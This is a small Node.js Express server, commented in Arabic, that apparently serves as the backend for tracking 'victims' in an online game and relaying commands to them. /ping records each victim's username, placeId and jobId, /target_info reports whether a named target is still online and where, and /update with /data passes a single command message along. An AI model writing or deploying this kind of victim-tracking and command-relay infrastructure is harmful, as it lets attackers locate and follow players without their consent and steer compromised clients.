const express = require('express');
const app = express();
app.use(express.json());

let activePlayers = {}; // قاعدة بيانات اللاعبين في الذاكرة
let chatData = { username: "System", message: "No Command", time: Date.now() };

// [تحديث] استقبال إشارة الضحية مع تحديث المكان والسيرفر فوراً
app.post('/ping', (req, res) => {
    const { username, placeId, jobId } = req.body;
    if (username) {
        activePlayers[username] = {
            placeId: placeId,
            jobId: jobId,
            lastSeen: Date.now() // تسجيل آخر لحظة تواجد
        };
    }
    res.send("Updated");
});

// [تحديث] جلب أحدث بيانات للضحية (التأكد من أنها لا تزال متصلة)
app.get('/target_info', (req, res) => {
    const username = req.query.username;
    const info = activePlayers[username];
    
    if (info) {
        const now = Date.now();
        // إذا مرت أكثر من 12 ثانية بدون إشارة، نعتبرها غادرت
        if (now - info.lastSeen < 12000) {
            res.json({
                placeId: info.placeId,
                jobId: info.jobId,
                status: "Online"
            });
        } else {
            res.status(404).json({ status: "Offline" });
        }
    } else {
        res.status(404).json({ status: "Not Registered" });
    }
});

app.get('/players', (req, res) => {
    const now = Date.now();
    const onlineList = Object.keys(activePlayers).filter(user => (now - activePlayers[user].lastSeen) < 12000);
    res.json(onlineList);
});

app.post('/update', (req, res) => {
    chatData = { username: req.body.username, message: req.body.message, time: Date.now() };
    res.send("OK");
});

app.get('/data', (req, res) => res.json(chatData));

app.listen(process.env.PORT || 3000, () => console.log('Server Live'));
